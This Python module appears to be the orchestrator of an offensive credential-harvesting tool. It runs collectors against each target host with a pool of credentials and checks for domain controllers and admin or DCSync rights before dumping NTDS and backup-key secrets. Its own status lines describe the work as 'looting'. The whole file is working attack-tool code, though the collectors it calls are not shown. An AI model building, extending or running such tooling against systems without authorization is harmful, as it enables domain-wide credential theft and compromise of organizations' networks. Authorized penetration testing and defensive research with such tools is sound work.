"""Orchestrator: targets x collectors x credential-pool (scoped per host).
Finished collectors print a line that stays; the active one shows on a spinner.
AD collectors auto-skip on non-DC hosts (LDAP check); NTDS/BackupKey auto-skip
unless a cred is admin on the DC. Pauses & waits on connection loss. -v = log."""
from __future__ import annotations

import os
import sys
import time
from typing import List, Optional, Type

from .credential import CredentialPool
from .secret import Secret
from .tools import find_tool, ldap_reachable, tcp_open, smb_admin
from collectors.base import BaseCollector


def _log(msg: str) -> None:
    print(f"[*] {msg}", file=sys.stderr)


def _wait_reachable(host: str, line, active) -> None:
    if tcp_open(host, 445, 2):
        return
    line(f"[yellow]!! lost connection to {host} - waiting for reconnect "
         f"(Ctrl-C to abort)[/yellow]")
    while True:
        active(f"{host}  waiting for reconnect...")
        time.sleep(5)
        if tcp_open(host, 445, 2):
            line(f"[green]** reconnected to {host}, continuing[/green]")
            return


def run_all(targets: List[str], pool: CredentialPool,
            collectors: List[Type[BaseCollector]], out_dir: str,
            timeout: int = 300, verbose: bool = False) -> List[Secret]:
    results: List[Secret] = []

    console = None
    status = None
    if not verbose:
        try:
            from rich.console import Console
            console = Console(stderr=True)
            status = console.status("[bold green]starting...", spinner="line")
            status.start()
        except Exception:
            console = None

    def line(msg: str) -> None:
        if console is not None:
            console.print(msg, highlight=False)
        else:
            print(msg, file=sys.stderr)

    def active(msg: str) -> None:
        if status is not None:
            status.update(f"[bold green]{msg}")

    try:
        for host in targets:
            hpool = pool.for_host(host)
            line(f"[bold]== {host} ==[/bold]  ({len(hpool)} cred(s))" if console
                 else f"== {host} == ({len(hpool)} cred(s))")

            raw_dir = os.path.join(out_dir, "raw", host.replace(":", "_"))
            ldap_ok: Optional[bool] = None
            admin_ok: Optional[bool] = None

            for Col in collectors:
                missing = [t for t in Col.requires if not find_tool(t)]
                if missing:
                    line(f"   {Col.name:<12} skipped (missing {','.join(missing)})")
                    continue

                if Col.needs_ldap:
                    if ldap_ok is None:
                        active(f"{host}  checking LDAP")
                        ldap_ok = ldap_reachable(host)
                    if not ldap_ok:
                        line(f"   {Col.name:<12} skipped (no LDAP - not a DC)")
                        continue

                if Col.needs_admin_dc:
                    if admin_ok is None:
                        active(f"{host}  checking admin/DCSync rights")
                        admin_ok = any(smb_admin(host, c) for c in hpool)
                    if not admin_ok:
                        line(f"   {Col.name:<12} skipped (no admin/DCSync on target)")
                        continue

                _wait_reachable(host, line, active)
                active(f"{host}  looting  {Col.description or Col.name}")
                col = Col(host=host, raw_dir=raw_dir, timeout=timeout,
                          verbose=verbose, creds=list(hpool))
                got: List[Secret] = []

                if Col.per_credential:
                    for cred in hpool:
                        if verbose:
                            _log(f"{host} {Col.name} <- {cred.label}")
                        got += col.collect_with_cred(cred)
                else:
                    for cred in hpool:
                        if verbose:
                            _log(f"{host} {Col.name} <- {cred.label}")
                        part = col.collect_once(cred)
                        if part:
                            got += part
                            break

                n = _merge(results, got)
                mark = f"[green]{n:>3}[/green]" if (console and n) else f"{n:>3}"
                line(f"   {Col.name:<12} {mark} finding(s)")
    finally:
        if status is not None:
            status.stop()

    return results


def _merge(acc: List[Secret], new: List[Secret]) -> int:
    existing = {s.key() for s in acc}
    added = 0
    for s in new:
        if s.key() in existing:
            continue
        existing.add(s.key())
        acc.append(s)
        added += 1
    return added
